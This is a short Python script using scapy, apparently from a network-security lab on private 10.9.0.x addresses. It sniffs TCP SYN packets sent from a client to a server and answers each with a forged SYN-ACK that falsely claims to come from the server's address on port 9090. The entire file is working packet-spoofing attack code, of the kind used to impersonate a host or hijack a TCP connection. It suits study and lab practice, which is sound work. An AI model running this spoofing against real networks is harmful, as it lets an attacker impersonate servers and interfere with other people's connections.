#!/usr/bin/python3
from scapy.all import *
'''
server 10.9.0.6
xterm 10.9.0.5
myself 10.9.0.7
'''

def spoof(pkt):
    if pkt[TCP].flags=="S" :
        ip=IP(src="10.9.0.6",dst="10.9.0.5")
        tcp=TCP()
        tcp.flags="SA"
        tcp.sport=9090
        tcp.dport=pkt[TCP].sport
        tcp.window=pkt[TCP].window
        tcp.seq=pkt[TCP].seq
        tcp.ack=pkt[TCP].seq+1
        p=ip/tcp
        send(p)
sniff(filter="src 10.9.0.5 and dst 10.9.0.6 and tcp",prn=spoof)